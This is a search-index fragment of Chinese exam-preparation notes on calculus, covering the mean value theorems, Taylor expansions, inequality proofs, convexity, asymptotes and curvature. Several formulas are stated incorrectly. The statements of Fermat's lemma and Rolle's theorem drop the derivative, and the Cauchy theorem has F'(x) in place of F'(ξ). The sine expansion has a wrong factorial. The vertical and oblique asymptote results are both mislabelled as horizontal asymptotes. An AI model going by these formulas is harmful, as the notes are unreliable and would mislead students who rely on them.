\u66f2\u7ebf\u7684\u51f9\u51f8\u6027 # \u5b9a\u4e49 \u8bbe\u51fd\u6570 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5982\u679c\u5bf9 I \u4e0a\u4efb\u610f\u4e24\u70b9 x_1, x_2 \uff0c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) < \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u5728 I \u4e0a\u7684\u56fe\u5f62\u662f\u51f9\u7684\u3002\u5982\u679c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) > \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u5728 I \u4e0a\u7684\u56fe\u5f62\u662f\u51f8\u7684\u3002 3.5. \u66f2\u7ebf\u7684\u6e10\u8fd1\u7ebf # 3.5.1. \u6e10\u8fd1\u7ebf\u7684\u5b9a\u4e49 # \u6e10\u8fd1\u7ebf \u82e5\u70b9 M \u6cbf\u66f2\u7ebf y = f(x) \u65e0\u9650\u8fdc\u79bb\u539f\u70b9\u65f6\uff0c\u5b83\u4e0e\u67d0\u6761\u76f4\u7ebf L \u4e4b\u95f4\u7684\u8ddd\u79bb\u5c06\u8d8b\u8fd1\u4e8e\u96f6\uff0c\u5219\u79f0\u76f4\u7ebf L \u4e3a\u66f2\u7ebf y = f(x) \u7684\u4e00\u6761 \u6e10\u8fd1\u7ebf \u3002 \u6c34\u5e73\u6e10\u8fd1\u7ebf \u82e5\u76f4\u7ebf L \u4e8e x \u8f74\u5e73\u884c\uff0c\u5219\u79f0 L \u4e3a\u66f2\u7ebf y= f(x) \u7684 \u6c34\u5e73\u6e10\u8fd1\u7ebf \uff1b \u5782\u76f4\u6e10\u8fd1\u7ebf \u82e5\u76f4\u7ebf L \u4e8e x \u8f74\u5782\u76f4\uff0c\u5219\u79f0 L \u4e3a\u66f2\u7ebf y = f(x) \u7684 \u5782\u76f4\u6e10\u8fd1\u7ebf \uff1b \u659c\u6e10\u8fd1\u7ebf \u82e5\u66f2\u7ebf\u5373\u4e0d\u5e73\u884c\u4e8e x \u8f74\uff0c\u4e5f\u4e0d\u5782\u76f4\u4e8e y \u8f74\uff0c\u5219\u79f0\u76f4\u7ebf L \u4e3a\u66f2\u7ebf y = f(x) \u7684 \u659c\u6e10\u8fd1\u7ebf \u3002 3.5.2. \u6e10\u8fd1\u7ebf\u7684\u6c42\u89e3 # \u6c34\u5e73\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to \\infty} f(x) = A \uff0c\u90a3\u4e48 y = A \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to -\\infty} f(x) = A . \u6216 \\lim\\limits_{x \\to +\\infty} f(x) = A . \u6700\u591a\u4e24\u6761 \u5782\u76f4\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to x_0s} f(x) = \\infty \uff0c\u90a3\u4e48 x = x_0 \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to - x_0} f(x) = A . \u6216 \\lim\\limits_{x \\to + x_0} f(x) = A . \u6700\u591a\u65e0\u7a77\u6761 \u659c\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to x_0s} \\dfrac{f(x)}{x} = a \uff0c\u4e14 \\lim\\limits_{x \\to \\infty }(f(x) - ax) = b \uff0c\u90a3\u4e48 x = x_0 \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to - \\infty }(f(x) - ax) = b . \u6216 \\lim\\limits_{x \\to + \\infty }(f(x) - ax) = b . \u6700\u591a\u4e24\u6761\uff0c\u67d0\u65b9\u5411\u82e5\u6709\u6c34\u5e73\u6e10\u8fd1\u7ebf\uff0c\u5219\u65e0\u659c\u6e10\u8fd1\u7ebf\uff0c\u82e5\u6709\u659c\u6e10\u8fd1\u7ebf\uff0c\u5219\u65e0\u6c34\u5e73\u6e10\u8fd1\u7ebf\u3002 \u82e5\u4e00\u4e2a\u66f2\u7ebf\u65b9\u7a0b\u53ef\u4ee5\u5199\u4e3a y = ax + b + \\alpha(x) \uff0c\u5176\u4e2d \\alpha(x) \u5728 x \\to \\infty \u65f6\u4e3a\u65e0\u7a77\u5c0f\uff0c\u5219\u6709\u659c\u6e10\u8fd1\u7ebf y = ax + b . 3.6. \u51fd\u6570\u7684\u4f5c\u56fe # \u5229\u7528\u51fd\u6570\u7684\u5355\u8c03\u6027\u3001\u6781\u503c\u3001\u66f2\u7ebf\u7684\u51f9\u51f8\u6027\u3001\u62d0\u70b9\u53ca\u6e10\u8fd1\u7ebf\u53ef\u4ee5\u4f5c\u51fa\u51fd\u6570\u66f2\u7ebf\u3002 \u6b65\u9aa4 \u6c42\u5b9a\u4e49\u57df\uff0c\u5224\u65ad\u662f\u5426\u6709\u65e0\u5b9a\u4e49\u70b9 \u6c42 y' \uff0c\u5224\u65ad\u5355\u8c03\u6027\u548c\u6781\u503c \u6c42 y'' \uff0c\u5224\u65ad\u66f2\u7ebf\u7684\u51f9\u51f8\u6027 \u6c42\u6781\u9650\uff0c\u5224\u65ad\u6e10\u8fd1\u7ebf \u4f5c\u56fe 3.7. \u66f2\u7ebf\u7684\u5f27\u5fae\u5206\u4e0e\u66f2\u7387 # \u5f27\u5fae\u5206 \u5b9a\u4e49\uff1a\u8bbe y = f(x) \u5728 (a, b) \u5185\u6709\u8fde\u7eed\u5bfc\u6570\uff0c\u5219\u6709 \u5f27\u5fae\u5206 ds = \\sqrt{1 + (y')^2}dx \\tag{3.15} \u66f2\u7387 \u5b9a\u4e49\uff1a\u8bbe y = f(x) \u6709\u4e8c\u9636\u5bfc\u6570\uff0c\u5219\u6709\u66f2\u7387 K = \\frac{|y''|}{(1 + (y')^2)^{3/2}} \\tag{3.16} \u66f2\u7387\u534a\u5f84 \u5b9a\u4e49\uff1a\u79f0 \\rho = \\dfrac{1}{K} \u4e3a \u66f2\u7387\u534a\u5f84 \u66f2\u7387\u5706 \u5b9a\u4e49\uff1a\u82e5\u66f2\u7ebf y = f(x) \u5728\u70b9 M(x, y) \u5904\u7684\u66f2\u7387\u4e3a K(K \\ne 0) \uff0c\u5728\u8fd9\u70b9 M \u5904\u66f2\u7ebf\u7684\u6cd5\u7ebf\u4e0a\uff0c\u5728\u66f2\u7ebf\u51f9\u7684\u4e00\u4fa7\u53d6\u4e00\u70b9 D \uff0c\u4f7f |DM| = \\dfrac{1}{K} = \\rho \uff0c\u4ee5 D \u4e3a\u5706\u5fc3\uff0c \\rho \u4e3a\u534a\u5f84\u7684\u5706\u6210\u4e3a\u66f2\u7ebf\u5728\u70b9 M \u7684\u66f2\u7387\u5706\u3002 \u66f2\u7387\u4e2d\u5fc3 \u5b9a\u4e49\uff1a\u66f2\u7387\u5706\u7684\u5706\u5fc3 D \uff0c\u79f0\u4e3a\u66f2\u7ebf\u5728\u70b9 M \u5904\u7684\u66f2\u7387\u4e2d\u5fc3\u3002 4. \u603b\u7ed3 # \u5fae\u5206\u4e2d\u503c\u5b9a\u7406 \u7f57\u5c14\u5b9a\u7406 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 \u67ef\u897f\u4e2d\u503c\u5b9a\u7406 \u6cf0\u52d2\u516c\u5f0f \u5bfc\u6570\u5e94\u7528 \u51fd\u6570\u7684\u5355\u8c03\u6027 \u51fd\u6570\u7684\u6781\u503c\u3001\u6700\u503c \u66f2\u7ebf\u7684\u51f9\u51f8\u6027\u548c\u6e10\u8fd1\u7ebf \u5f27\u5fae\u5206\u4e0e\u66f2\u7387","title":"3.\u7b2c\u4e09\u7ae0 \u5fae\u5206\u4e2d\u503c\u5b9a\u7406\u53ca\u5bfc\u6570\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#3","text":"","title":"\u7b2c3\u7ae0 \u5fae\u5206\u4e2d\u503c\u5b9a\u7406\u53ca\u5bfc\u6570\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#_1","text":"\u7b2c3\u7ae0 \u5fae\u5206\u4e2d\u503c\u5b9a\u7406\u53ca\u5bfc\u6570\u5e94\u7528 \u76ee\u5f55 1. \u80cc\u666f 2. \u5fae\u5206\u4e2d\u503c\u5b9a\u7406 2.1. \u8d39\u9a6c\u5f15\u7406 2.2. \u7f57\u5c14\u5b9a\u7406 2.3. \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 2.4. \u67ef\u897f\u4e2d\u503c\u5b9a\u7406 2.5. \u76ae\u4e9a\u8bfa\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f 2.6. \u62c9\u683c\u6717\u65e5\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f 2.7. \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f\uff08\u62c9\u683c\u6717\u65e5\u4f59\u9879\uff09 2.8. \u4e0d\u7b49\u5f0f\u7684\u8bc1\u660e 3. \u5bfc\u6570\u5e94\u7528 3.1. \u51fd\u6570\u7684\u5355\u8c03\u6027 3.2. \u51fd\u6570\u7684\u6781\u503c 3.3. \u51fd\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c 3.4. \u66f2\u7ebf\u7684\u51f9\u51f8\u6027 3.5. \u66f2\u7ebf\u7684\u6e10\u8fd1\u7ebf 3.5.1. \u6e10\u8fd1\u7ebf\u7684\u5b9a\u4e49 3.5.2. \u6e10\u8fd1\u7ebf\u7684\u6c42\u89e3 3.6. \u51fd\u6570\u7684\u4f5c\u56fe 3.7. \u66f2\u7ebf\u7684\u5f27\u5fae\u5206\u4e0e\u66f2\u7387 4. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e09\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#2","text":"","title":"2. \u5fae\u5206\u4e2d\u503c\u5b9a\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#21","text":"\u8bbe\u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u53ef\u5bfc\uff0c\u5982\u679c\u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u53d6\u5f97\u6781\u503c\uff0c\u90a3\u4e48 f(x_0) = 0 .","title":"2.1. \u8d39\u9a6c\u5f15\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#22","text":"\u5982\u679c f(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc f(a) = f(b) , \u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 f(\\xi) \\equiv 0 . \\text{\u56fe1 \u7f57\u5c14\u5b9a\u7406}","title":"2.2. \u7f57\u5c14\u5b9a\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#23","text":"\u5b9a\u4e49 \u5982\u679c f(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c \u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 f(b) - f(a) = f'(\\xi)(b - a) \\tag{3.1} \\text{\u56fe2 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406} \u8bc1\u660e \u5df2\u77e5\u51fd\u6570\u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u6784\u9020\u8f85\u52a9\u51fd\u6570 y = f(a) + \\dfrac{f(b)-f(a)}{b-a}(x-a) \u53ef\u5f97 g(a) = g(b) \uff0c\u53c8\u56e0\u4e3a g(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u6240\u4ee5\u6839\u636e\u7f57\u5c14\u5b9a\u7406\u53ef\u5f97\u5fc5\u6709\u4e00\u70b9 \\xi \\in (a, b) \uff0c\u4f7f\u5f97 g'(\\xi) = 0 \uff0c\u7531\u6b64\u53ef\u5f97 g'(\\xi) = f'(\\xi) - \\dfrac{f(b)-f(a)}{(b-a)} = 0 \u53d8\u5f62\u5f97 f(b) - f(a) = f'(\\xi)(b - a) \u5b9a\u7406\u8bc1\u6bd5\u3002","title":"2.3. \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#24","text":"\u5b9a\u4e49 \u5982\u679c f(x), F(x) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u5728\u95ed\u533a\u95f4 [a, b] \u4e0a\u8fde\u7eed \u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u4e14 F'(x) \u5728 (a, b) \u5185\u6bcf\u4e00\u70b9\u5747\u4e0d\u4e3a\u96f6\uff0c\u5219\u5728 (a, b) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \u4f7f\u5f97 \\frac{f'(\\xi)}{F'(x)} = \\frac{f(b)-f(a)}{F(b)-F(a)} \\tag{3.2} \\text{\u56fe3 \u67ef\u897f\u4e2d\u503c\u5b9a\u7406} \u8bc1\u660e \u8981\u8bc1\u660e \\frac{f'(\\xi)}{F'(x)} = \\frac{f(b)-f(a)}{F(b)-F(a)} \u53ef\u8f6c\u6362\u4e3a\u8bc1\u660e [f(b) - f(a)]F'(\\xi) - [F(b) - F(a)]f'(\\xi) = 0 \u6784\u9020\u51fd\u6570 \\varphi(x) = [f(b) - f(a)][F(x) - F(a)] - [F(b) - F(a)][f(x) - f(a)] \\varphi(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728\u5f00\u533a\u95f4 (a, b) \u5185\u53ef\u5bfc\uff0c\u4e14 \\varphi(a) = \\varphi(b) = 0 \uff0c\u7531\u7f57\u5c14\u5b9a\u7406\u53ef\u77e5\uff0c\u5b58\u5728 \\xi \\in (a, b) \uff0c\u4f7f\u5f97 \\varphi'(\\xi) = 0 \uff0c\u7531\u6b64\u53ef\u5f97 [f(b) - f(a)]F'(\\xi) - [F(b) - F(a)]f'(\\xi) = 0 \u5b9a\u7406\u8bc1\u6bd5\u3002","title":"2.4. \u67ef\u897f\u4e2d\u503c\u5b9a\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#25","text":"\u5982\u679c f(x) \u5728\u70b9 x_0 \u6709\u81f3 n \u9636\u7684\u5bfc\u6570\uff0c\u5219\u6709 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + o[(x - x_0)^n],x \\in U{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) } \\tag{3.3} \u5e38\u79f0 R_0 = o(x - x_0)^n \u4e3a\u76ae\u4e9a\u8bfa\u4f59\u9879\uff0c\u82e5 x_0 = 0 \uff0c\u5219\u5f97\u9ea6\u514b\u52b3\u6797\u516c\u5f0f f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {0} \\right) }{\\mathop{{x}}\\nolimits^{{n}}} + o(x^n),x \\in U{ \\left( {0} \\right) } \\tag{3.4}","title":"2.5. \u76ae\u4e9a\u8bfa\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#26","text":"\u8bbe f(x) \u5728\u70b9 x_0 \u6709\u81f3 n + 1 \u9636\u7684\u5bfc\u6570\uff0c\u5219\u5f53 x \\in (a, b) \u65f6\u6709 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + R_n(x) \\tag{3.5} \u5176\u4e2d R_n(x) = \\dfrac{f^{(n+1)}(\\xi)}{(n + 1)!}(x - x_0)^{n + 1} \uff0c\u8fd9\u91cc \\xi \u4ecb\u4e8e x_0 \u4e0e x \u4e4b\u95f4\uff0c\u79f0\u4e3a\u62c9\u683c\u6717\u65e5\u4f59\u9879\u3002","title":"2.6. \u62c9\u683c\u6717\u65e5\u578b\u4f59\u9879\u6cf0\u52d2\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#27","text":"e^x = 1 + x + {x^2\\over{2!}} + \\cdots + {x^n\\over{n!}} + \\frac{e^{\\theta x}}{(n + 1)!} x^{n + 1} \\tag{3.6} \\sin(x) = x - {x^3\\over{3!}} + \\cdots + (-1)^{n-1}{{x^{2n-1}}\\over{(2n)!}} + (-1)^{n} \\frac{cos(\\theta x)}{(2n + 1)!}x^{2n + 1} \\tag{3.7} \\cos(x) = 1 - {x^2\\over{2!}} + \\cdots + (-1)^{n}{{x^{2n}}\\over{(2n)!}} + + (-1)^{n} \\frac{cos(\\theta x)}{(2n + 2)!}x^{2n + 2} \\tag{3.8} \\ln(1 + x) = x - {x^2\\over{2}} + \\cdots + (-1)^{n-1}{{x^{n}\\over{n}}} + (-1)^{n} \\frac{x^{(n + 1)}}{(n + 1)(1 + \\theta x)^{n + 1}} \\tag{3.9} \\begin{aligned} (1 + x) ^ \\alpha = 1 + \\alpha x + {\\alpha (\\alpha - 1)\\over{2!} }x^2 + \\cdots + {[\\alpha!/(\\alpha - n)!]\\over{n!}}x^n + \\\\ \\frac{[\\alpha!/(\\alpha - n - 1)!]}{(n + 1)!}(1 + \\theta x) ^ {\\alpha - n - 1}x^{n + 1} \\tag{3.10} \\end{aligned}","title":"2.7. \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f\uff08\u62c9\u683c\u6717\u65e5\u4f59\u9879\uff09"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#28","text":"\u57fa\u672c\u4e0d\u7b49\u5f0f \\sin(x) < x < \\tan(x), x\\in (0, \\frac{\\pi}{2}) \\tag{3.11} \\frac{x}{1 + x} < \\ln(1 + x) < x, x\\in (0, +\\infty) \\tag{3.12} \u8bc1\u660e\u65b9\u6cd5 \u5355\u8c03\u6027 \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f f(x) \\ge g(x) \uff0c\u5728 x \\in [a, b] \u533a\u95f4\u6052\u6210\u7acb\uff0c\u53ef\u8f6c\u6362\u4e3a F(x) = f(x) - g(x) \\ge 0 \\tag{3.13} \u5373\u8bc1\u660e\u5728 [a, b] \u533a\u95f4\u5185 F'(x) > 0, F(a) \\le 0 \\tag{3.14} \u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7\u8bc1\u660e\u6784\u9020\u51fa\u7684\u51fd\u6570 F(x) \u5728\u95ed\u533a\u95f4\u5185\u5355\u8c03 \uff0c\u4e14\u5728\u7aef\u70b9\u503c\u6ee1\u8db3\u6761\u4ef6\uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f \\frac{x}{1 + x} < \\ln(1 + x) <x, (x > 0) \u6b65\u9aa4\u5982\u4e0b\uff1a \u4ee4 f(x) = ln(x) \uff0c f(x) \u6ee1\u8db3\u5728 [1, 1+x] \u4e0a\u8fde\u7eed\uff0c\u5728 (1, 1+x) \u5185\u53ef\u5bfc\uff0c\u5219\u5728 (1, 1+x) \u5185\u81f3\u5c11\u5b58\u5728\u4e00\u70b9 \\xi \uff0c\u4f7f\u5f97 \\ln(1 + x) = \\ln(1 + x) - \\ln(1) = (1 + x - 1)f'(\\xi) = \\frac{x}{\\xi} \u53c8\u56e0\u4e3a 1 < \\xi < (1 + x) \uff0c\u5e26\u5165\u7aef\u70b9\u503c\u5219\u4e0d\u7b49\u5f0f\u5f97\u8bc1\u3002\u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7 \u4f7f\u7528\u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406\u6784\u9020\u7684\u51fd\u6570 {(b - a)}f'(a) \\le {(b - a)}f'(\\xi) = {f(b)- f(a)} \\le {(b - a)}f'(b) \u5728\u7aef\u70b9\u503c\u6ee1\u8db3\u6761\u4ef6\uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002 \u6700\u5927\u6700\u5c0f\u503c \u8981\u8bc1\u660e\u4e0d\u7b49\u5f0f f(x) \\ge g(x) \uff0c\u5728 x \\in [a, b] \u533a\u95f4\u6052\u6210\u7acb\uff0c\u53ef\u8f6c\u6362\u4e3a F(x) = f(x) - g(x) \\ge 0 \u5373\u8bc1\u660e\u5728 [a, b] \u533a\u95f4\u5185\u6709\u4e00\u70b9 x_0 \u6ee1\u8db3 F'(x_0) = 0, \\lim\\limits_{x \\to -x_0}{f(x)} \\cdot \\lim\\limits_{x \\to +x_0}{f(x)} < 0 \u5373 x_0 \u70b9\u4e3a [a, b] \u533a\u95f4\u5185\u7684\u6781\u503c\u70b9\uff0c\u5e76\u8bc1\u660e x_0 \u70b9\u7684\u503c\u5c0f\u4e8e\u5176\u4ed6\u6781\u5c0f\u503c\u70b9\u548c\u7aef\u70b9\u503c\uff0c\u5373 x_0 \u70b9\u4e3a\u6700\u5c0f\u503c\u70b9\u3002\u540c\u65f6 f(x_0) \\ge 0 \u5219\u4e0d\u7b49\u5f0f\u5f97\u8bc1\u3002\u53ef\u603b\u7ed3\u4e3a\u901a\u8fc7\u8bc1\u660e \u6700\u503c\u70b9\u6ee1\u8db3\u6761\u4ef6 \uff0c\u4ece\u800c\u8bc1\u660e\u4e0d\u7b49\u5f0f\u3002","title":"2.8. \u4e0d\u7b49\u5f0f\u7684\u8bc1\u660e"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#3_1","text":"","title":"3. \u5bfc\u6570\u5e94\u7528"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#31","text":"\u5b9a\u7406 \u8bbe f(x) \u5728 [a, b] \u4e0a\u8fde\u7eed\uff0c\u5728 (a, b) \u5185\u53ef\u5bfc\u3002 \u82e5\u5728 (a, b) \u5185 f'(x)>0 \uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5355\u8c03\u9012\u589e \u82e5\u5728 (a, b) \u5185 f'(x)<0 \uff0c\u5219 f(x) \u5728 [a, b] \u4e0a\u5355\u8c03\u9012\u51cf","title":"3.1. \u51fd\u6570\u7684\u5355\u8c03\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#32","text":"","title":"3.2. 